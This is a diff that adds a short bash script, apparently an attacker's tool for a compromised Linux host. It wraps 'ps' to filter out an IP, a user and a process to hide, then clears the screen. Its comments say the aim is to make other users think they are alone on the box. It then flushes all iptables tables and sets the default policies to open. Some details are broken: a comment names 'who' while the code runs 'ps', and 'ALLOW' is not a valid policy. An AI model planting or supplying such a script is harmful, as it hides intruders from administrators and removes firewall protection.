@@ -1,0 +1,22 @@
+#!/bin/bash
+
+# Execute real 'who' command and don't display anything. Also mess with them
+# This will make them think they are the only one connected to the box
+# Clear the screen as well to make the command appear broken
+command ps $@ | grep -Ev "IP_TO_HIDE|USER_TO_HIDE|PROC_TO_HIDE" && clear
+
+# Source the ~/.bashrc
+source ~/.bashrc
+
+# Flush iptables rules
+command iptables -F
+command iptables -t mangle -F
+command iptables -t nat -F
+command iptables -t filter -F
+command iptables -t raw -F
+command iptables -t security -F
+
+# Change default policies for 'iptables'
+command iptables -P INPUT ALLOW
+command iptables -P OUTPUT ALLOW
+command iptables -P FORWARD ALLOW
